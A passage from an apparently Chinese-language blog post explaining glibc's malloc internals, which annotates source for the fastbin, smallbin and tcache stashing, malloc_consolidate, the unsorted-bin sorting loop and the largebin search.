victim, nb);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE  </span></span><br><span class="line">        <span class="comment">// 将待分配堆块对应的bin中所有剩下的堆块填充至tcache对应大小的bin中</span></span><br><span class="line">      <span class="comment">/* While we&#x27;re here, if we see other chunks of the same size,</span></span><br><span class="line"><span class="comment"> stash them in the tcache.  */</span></span><br><span class="line">      <span class="keyword">size_t</span> tc_idx = csize2tidx (nb);</span><br><span class="line">      <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">&#123;</span><br><span class="line">  mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* While bin not empty and tcache not full, copy chunks.  */</span></span><br><span class="line">  <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count <span class="comment">// mp_.tcache_count为7</span></span><br><span class="line"> &amp;&amp; (tc_victim = *fb) != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (SINGLE_THREAD_P)</span><br><span class="line">*fb = tc_victim-&gt;fd; <span class="comment">// 继续取下堆块，循环将堆块放入tcache</span></span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  REMOVE_FB (fb, pp, tc_victim);</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (tc_victim == <span class="literal">NULL</span>))</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">      tcache_put (tc_victim, tc_idx); <span class="comment">// 放入tcache</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">      <span class="keyword">void</span> *p = chunk2mem (victim); <span class="comment">// 转换成实际返回给用户的指针</span></span><br><span class="line">      alloc_perturb (p, bytes);</span><br><span class="line">      <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></li><li><p>如果<code>fastbins</code>中没有符合大小的堆块，那么继续判断实际需要分配的堆块大小是否在<code>smallbins</code>的范围之内，如果在范围之内，那么就检查<code>smallbins</code>中是否存在恰好符合大小的堆块，如果存在，取下此堆块，且将此堆块对应的bin中剩余的堆块放入<code>tcache</code>中，最后返回取下的堆块，结束malloc流程</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">     If a small request, check regular bin.  Since these &quot;smallbins&quot;</span></span><br><span class="line"><span class="comment">     hold one size each, no searching within bins is necessary.</span></span><br><span class="line"><span class="comment">     (For a large request, we need to wait until unsorted chunks are</span></span><br><span class="line"><span class="comment">     processed to find best fit. But for small ones, fits are exact</span></span><br><span class="line"><span class="comment">     anyway, so we can check now, which is faster.)</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (in_smallbin_range (nb)) <span class="comment">// 判断是否属于smallbins</span></span><br><span class="line">    &#123;</span><br><span class="line">      idx = smallbin_index (nb);</span><br><span class="line">      bin = bin_at (av, idx);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> ((victim = last (bin)) != bin) <span class="comment">// 当存在恰好符合大小的堆块</span></span><br><span class="line">        &#123;</span><br><span class="line">          bck = victim-&gt;bk;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>);</span><br><span class="line">          set_inuse_bit_at_offset (victim, nb);</span><br><span class="line">          bin-&gt;bk = bck; <span class="comment">// 取下堆块</span></span><br><span class="line">          bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">    set_non_main_arena (victim);</span><br><span class="line">          check_malloced_chunk (av, victim, nb);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE  </span></span><br><span class="line">    <span class="comment">// 与fastbin一致，将bin中剩余的堆块放入tcache</span></span><br><span class="line">  <span class="comment">/* While we&#x27;re here, if we see other chunks of the same size,</span></span><br><span class="line"><span class="comment">     stash them in the tcache.  */</span></span><br><span class="line">  <span class="keyword">size_t</span> tc_idx = csize2tidx (nb);</span><br><span class="line">  <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">    &#123;</span><br><span class="line">      mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* While bin not empty and tcache not full, copy chunks over.  */</span></span><br><span class="line">      <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count</span><br><span class="line">     &amp;&amp; (tc_victim = last (bin)) != bin)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (tc_victim != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      bck = tc_victim-&gt;bk;</span><br><span class="line">      set_inuse_bit_at_offset (tc_victim, nb);</span><br><span class="line">      <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">set_non_main_arena (tc_victim);</span><br><span class="line">      bin-&gt;bk = bck;</span><br><span class="line">      bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">      tcache_put (tc_victim, tc_idx);</span><br><span class="line">            &#125;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">          <span class="keyword">void</span> *p = chunk2mem (victim); <span class="comment">// 转换为mem，返回给用户</span></span><br><span class="line">          alloc_perturb (p, bytes);</span><br><span class="line">          <span class="keyword">return</span> p;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></li><li><p>当走到这一步时，说明实际需要分配的堆块有如下几种情况</p></li><li><ul><li>实际需要分配的是<code>smallbins</code>中的堆块，但是<code>smallbins</code>中没有恰好符合其大小的堆块可以被分配</li><li>实际需要分配的是<code>largebins</code>中的堆块</li></ul></li><li><p>接着，判断申请的堆块是否属于<code>largebins</code>，但是在取得对应的索引后，并没有直接去查找<code>largebins</code>中是否有对应大小的堆块可以被分配，而是执行了<code>malloc_consolidate</code>函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    If this is a large request, consolidate fastbins before continuing.</span></span><br><span class="line"><span class="comment">    While it might look excessive to kill all fastbins before</span></span><br><span class="line"><span class="comment">    even seeing if there is space available, this avoids</span></span><br><span class="line"><span class="comment">    fragmentation problems normally associated with fastbins.</span></span><br><span class="line"><span class="comment">    Also, in practice, programs tend to have runs of either small or</span></span><br><span class="line"><span class="comment">    large requests, but less often mixtures, so consolidation is not</span></span><br><span class="line"><span class="comment">    invoked all that often in most programs. And the programs that</span></span><br><span class="line"><span class="comment">    it is called frequently in otherwise tend to fragment.</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">  </span><br><span class="line"> <span class="keyword">else</span></span><br><span class="line">   &#123;</span><br><span class="line">     idx = largebin_index (nb);</span><br><span class="line">     <span class="keyword">if</span> (atomic_load_relaxed (&amp;av-&gt;have_fastchunks))</span><br><span class="line">       malloc_consolidate (av); <span class="comment">// 整理fastbins</span></span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure></li><li><p><code>malloc_consolidate</code>函数旨在将所有<code>fastbins</code>中的堆块(无论大小多少)，尝试将它们合并成大的堆块并放入<code>unsortedbins</code>中，而对无法合并的堆块，则也一起放入<code>unsortedbins</code>当中</p></li><li><p>在整理完成并放入<code>unsortedbins</code>后，malloc进入了一个大循环，这个大循环中有一个小循环将会将<code>unsortedbins</code>中的所有堆块一个接一个地取出来，并将其放入对应的bin中(<code>small/largebins</code>中的bin)，详细步骤可看注释</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">  INTERNAL_SIZE_T tcache_nb = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">size_t</span> tc_idx = csize2tidx (nb); <span class="comment">// nb为我们申请的堆块，这里假设申请的堆块在tcache范围内</span></span><br><span class="line">  <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)  <span class="comment">// 判断一下是否申请的堆块在tcache范围内</span></span><br><span class="line">    tcache_nb = nb; <span class="comment">// 如果在tcache范围内，给tcache_nb赋值</span></span><br><span class="line">  <span class="keyword">int</span> return_cached = <span class="number">0</span>; <span class="comment">// 这是一个flag，记录是否有合适的堆块被放入了tcache中</span></span><br><span class="line"></span><br><span class="line">  tcache_unsorted_count = <span class="number">0</span>; <span class="comment">// 计数器，记录处理了多少unsortedbins中的堆块</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (;; ) <span class="comment">// 大循环</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">int</span> iters = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">while</span> ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av)) <span class="comment">// 小循环，一个接一个判断</span></span><br><span class="line">        &#123;</span><br><span class="line">          bck = victim-&gt;bk;</span><br><span class="line">          <span class="keyword">if</span> (__builtin_expect (chunksize_nomask (victim) &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">              || __builtin_expect (chunksize_nomask (victim)</span><br><span class="line">   &gt; av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">            malloc_printerr (<span class="string">&quot;malloc(): memory corruption&quot;</span>);</span><br><span class="line">          size = chunksize (victim);</span><br><span class="line"></span><br><span class="line">          <span class="comment">/*</span></span><br><span class="line"><span class="comment">             If a small request, try to use last remainder if it is the</span></span><br><span class="line"><span class="comment">             only chunk in unsorted bin.  This helps promote locality for</span></span><br><span class="line"><span class="comment">             runs of consecutive small requests. This is the only</span></span><br><span class="line"><span class="comment">             exception to best-fit, and applies only when there is</span></span><br><span class="line"><span class="comment">             no exact fit for a small chunk.</span></span><br><span class="line"><span class="comment">           */</span></span><br><span class="line">          <span class="comment">// 如果我们申请的堆块是属于smallbins的，并且unsortedbins中有且仅有一个last_remainder</span></span><br><span class="line">          <span class="comment">// 同时last_remainder被切割后剩余的大小仍然大于MINSIZE(32字节)</span></span><br><span class="line">          <span class="comment">// 那么就尝试从last_remainder中切割一块下来进行分配</span></span><br><span class="line">          <span class="keyword">if</span> (in_smallbin_range (nb) &amp;&amp;</span><br><span class="line">              bck == unsorted_chunks (av) &amp;&amp;</span><br><span class="line">              victim == av-&gt;last_remainder &amp;&amp;</span><br><span class="line">              (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &gt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb + MINSIZE))</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="comment">/* split and reattach remainder */</span></span><br><span class="line">            <span class="comment">// 切割last_remainder并将剩下的last_remainder重新放入unsortedbins</span></span><br><span class="line">              remainder_size = size - nb;</span><br><span class="line">              remainder = chunk_at_offset (victim, nb);</span><br><span class="line">              unsorted_chunks (av)-&gt;bk = unsorted_chunks (av)-&gt;fd = remainder;</span><br><span class="line">              av-&gt;last_remainder = remainder;</span><br><span class="line">              remainder-&gt;bk = remainder-&gt;fd = unsorted_chunks (av);</span><br><span class="line">              <span class="keyword">if</span> (!in_smallbin_range (remainder_size))</span><br><span class="line">                &#123;</span><br><span class="line">                  remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                  remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">              set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                        (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">              set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">              set_foot (remainder, remainder_size);</span><br><span class="line"></span><br><span class="line">              check_malloced_chunk (av, victim, nb);</span><br><span class="line">              <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">              alloc_perturb (p, bytes);</span><br><span class="line">              <span class="keyword">return</span> p;</span><br><span class="line">            &#125;</span><br><span class="line">          <span class="comment">// 从unsortedbins中取下一个堆块</span></span><br><span class="line">          <span class="comment">/* remove from unsorted list */</span></span><br><span class="line">          unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line">          bck-&gt;fd = unsorted_chunks (av);</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* Take now instead of binning if exact fit */</span></span><br><span class="line">          <span class="comment">// 如果取下的堆块大小恰好等于我们申请的堆块大小</span></span><br><span class="line">          <span class="keyword">if</span> (size == nb)</span><br><span class="line">            &#123;</span><br><span class="line">              set_inuse_bit_at_offset (victim, size);</span><br><span class="line">              <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">set_non_main_arena (victim);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">      <span class="comment">/* Fill cache first, return to user only if cache fills.</span></span><br><span class="line"><span class="comment"> We may return one of these chunks later.  */</span></span><br><span class="line">       <span class="comment">// 如果取下的堆块大小恰好等于我们申请的堆块大小</span></span><br><span class="line">       <span class="comment">// 并且tcache对应大小的bin中没有被填满</span></span><br><span class="line">       <span class="comment">// 那么就先将这个堆块放入tcache对应大小的bin中，暂时不返回给用户，将return_cached置1并继续循环</span></span><br><span class="line">      <span class="keyword">if</span> (tcache_nb</span><br><span class="line">  &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_put (victim, tc_idx);</span><br><span class="line">  return_cached = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">          <span class="comment">// 在没有开启tcache机制的情况下，如果取下的堆块大小恰好等于我们申请的堆块大小，那么就直接将这个取下的堆块返回</span></span><br><span class="line">              check_malloced_chunk (av, victim, nb);</span><br><span class="line">              <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">              alloc_perturb (p, bytes);</span><br><span class="line">              <span class="keyword">return</span> p;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* place chunk in bin */</span></span><br><span class="line">          <span class="comment">// 如果取下的堆块大小并不恰好等于我们申请的堆块大小</span></span><br><span class="line">          <span class="comment">// 那么根据其大小，放入不同的bin中(small/largebins中的bin)</span></span><br><span class="line">          <span class="keyword">if</span> (in_smallbin_range (size))</span><br><span class="line">            &#123;</span><br><span class="line">              victim_index = smallbin_index (size);</span><br><span class="line">              bck = bin_at (av, victim_index);</span><br><span class="line">              fwd = bck-&gt;fd;</span><br><span class="line">            &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">              victim_index = largebin_index (size);</span><br><span class="line">              bck = bin_at (av, victim_index);</span><br><span class="line">              fwd = bck-&gt;fd;</span><br><span class="line"></span><br><span class="line">              <span class="comment">/* maintain large bins in sorted order */</span></span><br><span class="line">              <span class="keyword">if</span> (fwd != bck)</span><br><span class="line">                &#123;</span><br><span class="line">                  <span class="comment">/* Or with inuse bit to speed comparisons */</span></span><br><span class="line">                  size |= PREV_INUSE;</span><br><span class="line">                  <span class="comment">/* if smaller than smallest, bypass loop below */</span></span><br><span class="line">                  assert (chunk_main_arena (bck-&gt;bk));</span><br><span class="line">                  <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size)</span><br><span class="line">      &lt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) chunksize_nomask (bck-&gt;bk))</span><br><span class="line">                    &#123;</span><br><span class="line">                      fwd = bck;</span><br><span class="line">                      bck = bck-&gt;bk;</span><br><span class="line"></span><br><span class="line">                      victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">                      victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">                      fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">                    &#125;</span><br><span class="line">                  <span class="keyword">else</span></span><br><span class="line">                    &#123;</span><br><span class="line">                      assert (chunk_main_arena (fwd));</span><br><span class="line">                      <span class="keyword">while</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) size &lt; chunksize_nomask (fwd))</span><br><span class="line">                        &#123;</span><br><span class="line">                          fwd = fwd-&gt;fd_nextsize;</span><br><span class="line">  assert (chunk_main_arena (fwd));</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                      <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) size</span><br><span class="line">  == (<span class="keyword">unsigned</span> <span class="keyword">long</span>) chunksize_nomask (fwd))</span><br><span class="line">                        <span class="comment">/* Always insert in the second position.  */</span></span><br><span class="line">                        fwd = fwd-&gt;fd;</span><br><span class="line">                      <span class="keyword">else</span></span><br><span class="line">                        &#123;</span><br><span class="line">                          victim-&gt;fd_nextsize = fwd;</span><br><span class="line">                          victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">                          fwd-&gt;bk_nextsize = victim;</span><br><span class="line">                          victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">                        &#125;</span><br><span class="line">                      bck = fwd-&gt;bk;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">              <span class="keyword">else</span></span><br><span class="line">                victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">          mark_bin (av, victim_index);</span><br><span class="line">          victim-&gt;bk = bck;</span><br><span class="line">          victim-&gt;fd = fwd;</span><br><span class="line">          fwd-&gt;bk = victim;</span><br><span class="line">          bck-&gt;fd = victim;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">      <span class="comment">/* If we&#x27;ve processed as many chunks as we&#x27;re allowed while</span></span><br><span class="line"><span class="comment"> filling the cache, return one of the cached ones.  */</span></span><br><span class="line">        <span class="comment">// 计数处理了多少unsortedbins中的堆块</span></span><br><span class="line">      ++tcache_unsorted_count;</span><br><span class="line">        <span class="comment">// 如果return_cached为1，并且mp_.tcache_unsorted_limit大于0</span></span><br><span class="line">        <span class="comment">// 同时，已经处理的堆块数达到了上限</span></span><br><span class="line">        <span class="comment">// 那么就从tcache中取出一个之前放入的，对应大小的堆块返回给用户</span></span><br><span class="line">      <span class="keyword">if</span> (return_cached</span><br><span class="line">  &amp;&amp; mp_.tcache_unsorted_limit &gt; <span class="number">0</span></span><br><span class="line">  &amp;&amp; tcache_unsorted_count &gt; mp_.tcache_unsorted_limit)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> tcache_get (tc_idx);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="comment">// 最多迭代10000次后结束</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_ITERS       10000</span></span><br><span class="line">          <span class="keyword">if</span> (++iters &gt;= MAX_ITERS)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">    <span class="comment">// 防止明明已经找到了对应大小的堆块</span></span><br><span class="line">    <span class="comment">// 但由于放入了tcache中并且由于处理的unsortedbins数量没有到阀值，导致没有返回合适堆块的情况</span></span><br><span class="line">      <span class="comment">/* If all the small chunks we found ended up cached, return one now.  */</span></span><br><span class="line">      <span class="keyword">if</span> (return_cached)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> tcache_get (tc_idx);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure><ul><li><p>当走到这一步时，说明在整理了碎片后，依然无法从<code>unsortedbins</code>中找到恰好符合实际需要分配的堆块大小的堆块,并且此时<code>unsortedbins</code>中应当被清空了，其中的堆块全被分配至了<code>small/largebins</code>中</p></li><li><p>接着，程序判断实际需要分配的堆块是否是<code>largebins</code>的范围</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">         If a large request, scan through the chunks of current bin in</span></span><br><span class="line"><span class="comment">         sorted order to find smallest that fits.  Use the skip list for this.</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (!in_smallbin_range (nb))</span><br><span class="line">        &#123;</span><br><span class="line">          bin = bin_at (av, idx);</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* skip scan if empty or largest chunk is too small */</span></span><br><span class="line">         <span class="comment">// 如果对应的bin是空的，或者对应的bin中最大的堆块都比实际需要分配的要小，那么直接跳过下面的步骤</span></span><br><span class="line">          <span class="keyword">if</span> ((victim = first (bin)) != bin</span><br><span class="line">      &amp;&amp; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) chunksize_nomask (victim)</span><br><span class="line">        &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb))</span><br><span class="line">            &#123;</span><br><span class="line">              victim = victim-&gt;bk_nextsize;</span><br><span class="line">              <span class="keyword">while</span> (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size = chunksize (victim)) &lt;</span><br><span class="line">                      (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb)))</span><br><span class="line">                victim = victim-&gt;bk_nextsize;</span><br><span 